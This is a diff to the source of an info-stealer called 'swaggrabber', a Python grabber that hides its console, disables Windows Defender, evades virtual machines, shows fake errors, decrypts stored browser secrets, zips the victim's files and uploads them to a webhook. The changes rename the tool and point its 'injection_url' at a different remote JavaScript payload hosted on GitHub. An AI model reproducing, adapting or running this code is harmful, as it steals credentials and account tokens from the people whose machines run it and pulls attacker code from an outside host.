@@ -37,7 +37,7 @@ config = {
     'Hide_Console': True,
     'Disable_defender': True,
     'inject': True,
-    'injection_url': 'https://raw.githubusercontent.com/SWAGgrabber/swag-injection/main/swag.js',
+    'injection_url': 'https://raw.githubusercontent.com/j0taro/Oak-injection/main/Oak.js',
     'Black_Screen': True,
     'Fake_error_message': True,
     'Antivm': True,
@@ -95,7 +95,7 @@ class functions(object):
                     size = "{:.1f} MB".format(size/1024)
                 else:
                     size = "{:.1f} KB".format(size)
-                if f == f'SwagGrabber-{os.getlogin()}.zip':
+                if f == f'swaggrabber-{os.getlogin()}.zip':
                     continue
                 indent2 = branch if n != len(filenames) - 1 else last
                 ret += f"\n{space*(folder)}{indent2}{f} - {file} ({size})"
@@ -117,7 +117,7 @@ class functions(object):
             return f'Failed to decrypt "{str(buff)}" | Key: "{str(master_key)}"'
 
 
-class SWAGgrabber(functions):
+class swaggrabber(functions):
     def __init__(self):
         self.webhook = config.get('webhook')
         self.appdata = os.getenv("localappdata")
@@ -1340,12 +1340,12 @@ class SWAGgrabber(functions):
 
     def upload(self):
         name = os.getlogin()
-        _zipfile = os.path.join(self.dir, f'SwagGrabber-{os.getlogin()}.zip')
+        _zipfile = os.path.join(self.dir, f'swaggrabber-{os.getlogin()}.zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = os.path.abspath(self.dir)
         for dirname, _, files in os.walk(self.dir):
             for filename in files:
-                if filename == f'SwagGrabber-{os.getlogin()}.zip':
+                if filename == f'swaggrabber-{os.getlogin()}.zip':
                     continue
                 absname = os.path.abspath(os.path.join(dirname, filename))
                 arcname = absname[len(abs_src) + 1:]
